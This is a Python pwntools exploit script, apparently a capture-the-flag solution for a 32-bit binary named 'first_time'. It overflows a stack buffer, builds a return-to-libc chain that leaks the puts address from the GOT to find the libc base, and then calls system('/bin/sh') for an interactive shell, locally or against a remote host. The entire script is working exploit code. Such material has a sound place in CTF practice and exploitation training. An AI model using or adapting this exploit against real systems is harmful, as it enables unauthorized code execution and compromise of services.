#!/usr/bin/env python
from pwn import *
import sys

HOST = 'None'
PORT = None

def info(s):
	log.info(s)

def exploit(p):
	p.sendafter('do this?',str(int(0x61616101)))
	puts=0x080484B0
	puts_got=0x0804A024
	start=0x08048510
	payload='a'*0x28+p32(puts)+p32(start)+p32(puts_got)
	p.send(payload)
	p.recvuntil('Oke, I understood.')
	l=p.recvuntil('Eve')[1:5]
	put_gl=u32(l)
	
	base=put_gl-libc.symbols['puts']
	info("base is 0x%x"%base)
	system=base+libc.symbols['system']
	binsh=next(libc.search('/bin/sh\x00'))+base
	p.sendafter('do this?',str(int(0x62626201)))
	payload='a'*0x28+p32(system)+p32(start)+p32(binsh)
	p.send(payload)
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./first_time')
		print util.proc.pidof(p)
		pause()
		libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		exploit(p)

	else:
		libc=ELF('./libc-2.23.so')
		p=remote(HOST,PORT)
		exploit(p)
